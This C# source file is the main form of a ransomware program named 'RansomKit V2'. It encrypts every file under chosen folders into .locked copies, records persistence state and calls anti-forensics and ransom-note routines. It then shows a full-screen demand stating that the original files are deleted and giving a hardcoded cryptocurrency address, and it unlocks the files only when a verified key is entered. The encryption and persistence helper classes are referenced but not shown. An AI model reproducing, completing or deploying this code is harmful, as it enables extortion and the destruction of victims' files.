using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomKitV2
{
    public class MainForm : Form
    {
        private readonly LaunchMode _mode;

        private Panel _setupPanel = null!;
        private Panel _payPanel = null!;

        private ListBox _folderList = null!;
        private Button _addFolderBtn = null!;
        private Button _startBtn = null!;
        private Label _setupStatus = null!;

        private TextBox _keyBox = null!;
        private Button _unlockButton = null!;
        private Label _statusLabel = null!;

        private const string CryptoAddress = "Dqcwgm1FseFNQCgECgPvnMA7SjyDTpif3CroYB47znuD";

        public MainForm(LaunchMode mode = LaunchMode.Normal)
        {
            _mode = mode;
            Text = "RansomKit V2";
            StartPosition = FormStartPosition.CenterScreen;
            FormBorderStyle = FormBorderStyle.FixedSingle;
            MaximizeBox = false;
            MinimizeBox = true;
            BackColor = Color.FromArgb(20, 20, 24);
            AutoScaleMode = AutoScaleMode.Font;

            BuildSetupPanel();
            BuildPayPanel();

            Controls.Add(_setupPanel);
            Controls.Add(_payPanel);

            Load += OnLoad;
        }

        private void OnLoad(object? sender, EventArgs e)
        {
            bool locked = Persistence.IsLocked();

            if (_mode == LaunchMode.Silent || _mode == LaunchMode.Decrypt || locked)
            {
                _setupPanel.Visible = false;
                _payPanel.Visible = true;
                TopMost = true;
                Activate();
            }
            else
            {
                _setupPanel.Visible = true;
                _payPanel.Visible = false;
            }
        }

        // =========================================================
        //  SETUP PANEL
        // =========================================================
        private void BuildSetupPanel()
        {
            _setupPanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = Color.FromArgb(20, 20, 24),
            };

            var header = new Label
            {
                Text = "RANSOMKIT V2 — SETUP",
                ForeColor = Color.FromArgb(220, 40, 40),
                Font = new Font("Segoe UI", 15f, FontStyle.Bold),
                Dock = DockStyle.Top,
                Height = 48,
                TextAlign = ContentAlignment.MiddleCenter,
            };

            _folderList = new ListBox
            {
                Dock = DockStyle.Top,
                Height = 340,
                BackColor = Color.FromArgb(30, 30, 36),
                ForeColor = Color.Gainsboro,
                BorderStyle = BorderStyle.FixedSingle,
                Font = new Font("Consolas", 9f),
            };

            var buttonRow = new FlowLayoutPanel
            {
                Dock = DockStyle.Top,
                Height = 48,
                FlowDirection = FlowDirection.LeftToRight,
                Padding = new Padding(6),
                BackColor = Color.FromArgb(20, 20, 24),
            };

            _addFolderBtn = new Button
            {
                Text = "Add Folder",
                Width = 120,
                Height = 32,
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 40, 48),
                ForeColor = Color.White,
            };
            _addFolderBtn.Click += AddFolderBtn_Click;

            _startBtn = new Button
            {
                Text = "Start Encryption",
                Width = 160,
                Height = 32,
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(180, 30, 30),
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 9f, FontStyle.Bold),
            };
            _startBtn.Click += StartBtn_Click;

            buttonRow.Controls.Add(_addFolderBtn);
            buttonRow.Controls.Add(_startBtn);

            _setupStatus = new Label
            {
                Dock = DockStyle.Top,
                Height = 28,
                ForeColor = Color.Gainsboro,
                Font = new Font("Segoe UI", 9f),
                TextAlign = ContentAlignment.MiddleCenter,
                Text = "Add one or more folders, then start.",
            };

            _setupPanel.Controls.Add(_setupStatus);
            _setupPanel.Controls.Add(buttonRow);
            _setupPanel.Controls.Add(_folderList);
            _setupPanel.Controls.Add(header);
        }

        private void AddFolderBtn_Click(object? sender, EventArgs e)
        {
            using var dlg = new FolderBrowserDialog
            {
                Description = "Pick a folder to encrypt",
                ShowNewFolderButton = false,
            };
            if (dlg.ShowDialog(this) == DialogResult.OK && Directory.Exists(dlg.SelectedPath))
            {
                if (!_folderList.Items.Contains(dlg.SelectedPath))
                    _folderList.Items.Add(dlg.SelectedPath);
            }
        }

        // =========================================================
        //  ENCRYPT — parallel, session-key cached
        // =========================================================
        private async void StartBtn_Click(object? sender, EventArgs e)
        {
            var roots = _folderList.Items.Cast<string>().ToList();
            if (roots.Count == 0)
            {
                MessageBox.Show(this, "Add at least one folder first.", "RansomKit",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            _startBtn.Enabled = false;
            _setupStatus.Text = "Scanning...";

            var files = await Task.Run(() => Walker.Walk(roots));
            if (files.Count == 0)
            {
                _setupStatus.Text = "No target files found.";
                _startBtn.Enabled = true;
                return;
            }

            // Persist state BEFORE modifying disk so a crash mid-encrypt
            // still leaves a recoverable manifest.
            StateManager.Save(new StateData
            {
                Files = files,
                Paths = roots,
                Locked = true,
            });
            Persistence.SavePaths(roots);
            Persistence.SetLocked(true);

            // Derive the session key once, off the UI thread.
            await Task.Run(() => CryptoEngine.PrimeSessionKey());

            int total = files.Count;
            int done = 0;
            int cores = Environment.ProcessorCount;

            _setupStatus.Text = $"Encrypting 0/{total}...";

            await Task.Run(() =>
            {
                Parallel.ForEach(
                    files,
                    new ParallelOptions { MaxDegreeOfParallelism = cores },
                    f =>
                    {
                        try
                        {
                            CryptoEngine.EncryptFile(f);
                            int current = Interlocked.Increment(ref done);

                            if (current % 25 == 0 || current == total)
                            {
                                try
                                {
                                    _setupStatus.BeginInvoke((Action)(() =>
                                        _setupStatus.Text = $"Encrypting {current}/{total}..."));
                                }
                                catch { }
                            }
                        }
                        catch { }
                    });
            });

            await Task.Run(() =>
            {
                try { AntiForensics.Run(); } catch { }
                try { NoteDropper.Drop(roots); } catch { }
            });

            CryptoEngine.ResetSessionKey();

            _setupStatus.Text = $"Encrypted {done} files.";
            _setupPanel.Visible = false;
            _payPanel.Visible = true;
            TopMost = true;
            Activate();
        }

        // =========================================================
        //  PAY / UNLOCK PANEL
        // =========================================================
        private void BuildPayPanel()
        {
            var bg = Color.FromArgb(20, 20, 24);
            var cardBg = Color.FromArgb(26, 26, 30);
            var accent = Color.FromArgb(220, 40, 40);
            var textMain = Color.FromArgb(230, 230, 235);
            var textDim = Color.FromArgb(140, 140, 155);

            _payPanel = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = bg,
                Visible = false,
                AutoScroll = false,
            };

            var container = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = bg,
                Padding = new Padding(24, 16, 24, 16),
            };

            var layout = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 1,
                RowCount = 12,
                BackColor = bg,
            };
            layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100f));

            // Row 0: Title
            var title = new Label
            {
                Text = "YOUR FILES HAVE BEEN ENCRYPTED",
                ForeColor = accent,
                Font = new Font("Segoe UI", 15f, FontStyle.Bold),
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.MiddleCenter,
                Margin = new Padding(0, 0, 0, 12),
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
            layout.Controls.Add(title, 0, 0);

            // Row 1: Notice Card
            var noteCard = new Panel
            {
                Dock = DockStyle.Fill,
                BackColor = cardBg,
                BorderStyle = BorderStyle.FixedSingle,
                Padding = new Padding(16, 12, 16, 12),
                Margin = new Padding(0, 0, 0, 16),
            };
            var accentBar = new Panel
            {
                Dock = DockStyle.Left,
                Width = 4,
                BackColor = accent,
            };
            var noteText = new Label
            {
                Dock = DockStyle.Fill,
                ForeColor = textMain,
                Font = new Font("Segoe UI", 9.5f),
                TextAlign = ContentAlignment.TopLeft,
                Text =
                    "Your important documents, photos, and files have been encrypted with a secure AES-256 algorithm. The original files have been deleted.\r\n\r\n" +
                    "To restore your data, you must obtain the unique decryption key. Complete the payment to one of the addresses below to receive it.\r\n\r\n" +
                    "IMPORTANT: Do not rename, move, or modify the .locked files. Doing so will permanently corrupt your data.",
            };
            noteCard.Controls.Add(noteText);
            noteCard.Controls.Add(accentBar);
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 150f));
            layout.Controls.Add(noteCard, 0, 1);

            // Row 2: Crypto Header
            var cryptoHeader = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0, 0, 0, 4) };
            var cryptoTitle = new Label
            {
                Text = "CRYPTO ADDRESS (USDT)",
                ForeColor = textDim,
                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
                Dock = DockStyle.Top,
                Height = 16,
            };
            var cryptoAddrBox = new TextBox
            {
                Text = CryptoAddress,
                ForeColor = textMain,
                BackColor = bg,
                Font = new Font("Consolas", 10f),
                BorderStyle = BorderStyle.None,
                ReadOnly = true,
                Dock = DockStyle.Top,
                Width = 400,
            };
            cryptoHeader.Controls.Add(cryptoAddrBox);
            cryptoHeader.Controls.Add(cryptoTitle);
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 36f));
            layout.Controls.Add(cryptoHeader, 0, 2);

            // Row 3: Crypto Scanner
            Image? cryptoImage = ScannerAsset.LoadAsset("scanner");
            var cryptoScannerBox = new PictureBox
            {
                Dock = DockStyle.Fill,
                SizeMode = PictureBoxSizeMode.Zoom,
                BackColor = Color.FromArgb(14, 14, 18),
                BorderStyle = BorderStyle.FixedSingle,
                Padding = new Padding(4),
                Margin = new Padding(0, 0, 0, 16),
            };
            cryptoScannerBox.Image = cryptoImage ?? BuildPlaceholder();
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 200f));
            layout.Controls.Add(cryptoScannerBox, 0, 3);

            // Row 4 & 5: Binance (optional)
            var (binanceImage, binanceFailed) = TryLoadBinanceScanner();
            bool hasBinance = binanceImage != null || binanceFailed;

            var binanceHeader = new Label
            {
                Text = binanceFailed ? "BINANCE (IMAGE FAILED TO LOAD)" : "BINANCE ADDRESS",
                ForeColor = binanceFailed ? Color.FromArgb(220, 80, 80) : textDim,
                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.BottomLeft,
                Margin = new Padding(0, 0, 0, 4),
            };

            var binanceScannerBox = new PictureBox
            {
                Dock = DockStyle.Fill,
                SizeMode = PictureBoxSizeMode.Zoom,
                BackColor = Color.FromArgb(14, 14, 18),
                BorderStyle = BorderStyle.FixedSingle,
                Padding = new Padding(4),
                Margin = new Padding(0, 0, 0, 16),
            };
            if (binanceImage != null) binanceScannerBox.Image = binanceImage;
            else if (binanceFailed) binanceScannerBox.Image = BuildBinanceErrorPlaceholder();

            if (hasBinance)
            {
                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
                layout.Controls.Add(binanceHeader, 0, 4);
                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 180f));
                layout.Controls.Add(binanceScannerBox, 0, 5);
            }
            else
            {
                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 0f));
                layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 0f));
            }

            // Row 6: Divider
            var divider = new Panel
            {
                Dock = DockStyle.Fill,
                Height = 1,
                BackColor = Color.FromArgb(50, 50, 58),
                Margin = new Padding(0, 0, 0, 16),
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 1f));
            layout.Controls.Add(divider, 0, 6);

            // Row 7: Key Label
            var keyLabel = new Label
            {
                Text = "ENTER DECRYPTION KEY",
                ForeColor = textDim,
                Font = new Font("Segoe UI", 8.5f, FontStyle.Bold),
                Dock = DockStyle.Fill,
                TextAlign = ContentAlignment.BottomLeft,
                Margin = new Padding(0, 0, 0, 4),
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 20f));
            layout.Controls.Add(keyLabel, 0, 7);

            // Row 8: Key Input
            _keyBox = new TextBox
            {
                Dock = DockStyle.Fill,
                Font = new Font("Consolas", 11f),
                BackColor = Color.FromArgb(30, 30, 36),
                ForeColor = Color.White,
                BorderStyle = BorderStyle.FixedSingle,
                Margin = new Padding(0, 0, 0, 12),
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 32f));
            layout.Controls.Add(_keyBox, 0, 8);

            // Row 9: Unlock Button
            _unlockButton = new Button
            {
                Text = "UNLOCK FILES",
                Dock = DockStyle.Fill,
                FlatStyle = FlatStyle.Flat,
                BackColor = accent,
                ForeColor = Color.White,
                Font = new Font("Segoe UI", 11f, FontStyle.Bold),
                Margin = new Padding(0, 0, 0, 8),
            };
            _unlockButton.FlatAppearance.BorderSize = 0;
            _unlockButton.Click += UnlockButton_Click;
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 44f));
            layout.Controls.Add(_unlockButton, 0, 9);

            // Row 10: Status
            _statusLabel = new Label
            {
                Dock = DockStyle.Fill,
                ForeColor = textDim,
                Font = new Font("Segoe UI", 9f),
                TextAlign = ContentAlignment.MiddleCenter,
            };
            layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 24f));
            layout.Controls.Add(_statusLabel, 0, 10);

            // Row 11: Filler
            layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100f));

            container.Controls.Add(layout);
            _payPanel.Controls.Add(container);

            // Auto-resize
            int totalHeight = 16 + 44 + 150 + 36 + 200 + 16 + 1 + 20 + 32 + 44 + 24 + 16;
            if (hasBinance) totalHeight += (20 + 180);

            ClientSize = new Size(540, totalHeight);
        }

        private static (Image? image, bool fileFoundButFailed) TryLoadBinanceScanner()
        {
            var embedded = ScannerAsset.LoadEmbedded("binance");
            if (embedded != null) return (embedded, false);

            var disk = ScannerAsset.LoadFromDisk("binance");
            if (disk != null) return (disk, false);

            string baseDir = AppContext.BaseDirectory;
            foreach (var ext in new[] { "png", "jpg", "jpeg" })
            {
                if (File.Exists(Path.Combine(baseDir, "binance." + ext)))
                    return (null, true);
            }

            return (null, false);
        }

        private static Bitmap BuildPlaceholder()
        {
            var bmp = new Bitmap(460, 200);
            using var g = Graphics.FromImage(bmp);
            using var pen = new Pen(Color.FromArgb(70, 70, 80));
            using var font = new Font("Segoe UI", 10f);
            using var brush = new SolidBrush(Color.DimGray);

            g.Clear(Color.FromArgb(14, 14, 18));
            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
            const string text = "scanner image missing — add scanner.png and rebuild";
            var size = g.MeasureString(text, font);
            g.DrawString(text, font, brush,
                (bmp.Width - size.Width) / 2f,
                (bmp.Height - size.Height) / 2f);
            return bmp;
        }

        private static Bitmap BuildBinanceErrorPlaceholder()
        {
            var bmp = new Bitmap(460, 180);
            using var g = Graphics.FromImage(bmp);
            using var pen = new Pen(Color.FromArgb(120, 40, 40));
            using var font = new Font("Segoe UI", 10f);
            using var brush = new SolidBrush(Color.FromArgb(220, 80, 80));

            g.Clear(Color.FromArgb(14, 14, 18));
            g.DrawRectangle(pen, 0, 0, bmp.Width - 1, bmp.Height - 1);
            const string text = "binance image found but could not be loaded\n(re-save as standard JPEG or PNG)";
            var size = g.MeasureString(text, font);
            g.DrawString(text, font, brush,
                (bmp.Width - size.Width) / 2f,
                (bmp.Height - size.Height) / 2f);
            return bmp;
        }

        // =========================================================
        //  DECRYPT — parallel, session-key cached
        // =========================================================
        private async void UnlockButton_Click(object? sender, EventArgs e)
        {
            string key = _keyBox.Text ?? string.Empty;
            if (!CryptoEngine.VerifyPassword(key))
            {
                _statusLabel.Text = "Invalid key.";
                _statusLabel.ForeColor = Color.FromArgb(220, 80, 80);
                return;
            }

            var state = StateManager.Load();
            var files = state?.Files ?? new List<string>();
            var paths = state?.Paths ?? Persistence.LoadPaths();

            if (files.Count == 0 && paths.Count > 0)
            {
                files = Walker.Walk(paths)
                    .Where(f => f.EndsWith(CryptoEngine.LockedExtension,
                                           StringComparison.OrdinalIgnoreCase))
                    .ToList();
            }

            _unlockButton.Enabled = false;
            _statusLabel.ForeColor = Color.FromArgb(150, 150, 165);
            _statusLabel.Text = "Decrypting...";

            int total = files.Count;
            int done = 0, failed = 0;
            int cores = Environment.ProcessorCount;

            await Task.Run(() =>
            {
                Parallel.ForEach(
                    files,
                    new ParallelOptions { MaxDegreeOfParallelism = cores },
                    f =>
                    {
                        string target = f.EndsWith(CryptoEngine.LockedExtension,
                                                   StringComparison.OrdinalIgnoreCase)
                            ? f
                            : f + CryptoEngine.LockedExtension;

                        if (!File.Exists(target))
                        {
                            Interlocked.Increment(ref failed);
                            return;
                        }

                        try
                        {
                            CryptoEngine.DecryptFile(target);
                            int current = Interlocked.Increment(ref done);

                            if (current % 25 == 0 || current == total)
                            {
                                try
                                {
                                    _statusLabel.BeginInvoke((Action)(() =>
                                        _statusLabel.Text = $"Decrypting {current}/{total}..."));
                                }
                                catch { }
                            }
                        }
                        catch { Interlocked.Increment(ref failed); }
                    });
            });

            CryptoEngine.ResetSessionKey();

            StateManager.Clear();
            Persistence.DisableAutoStart();
            Persistence.SetLocked(false);
            Persistence.ClearPaths();

            TopMost = false;
            _statusLabel.ForeColor = Color.Gainsboro;
            _statusLabel.Text = $"Decrypted {done} files. ({failed} missing/failed)";
            MessageBox.Show(this, $"Done.\nDecrypted: {done}\nSkipped: {failed}",
                "RansomKit", MessageBoxButtons.OK, MessageBoxIcon.Information);

            Close();
        }
    }
}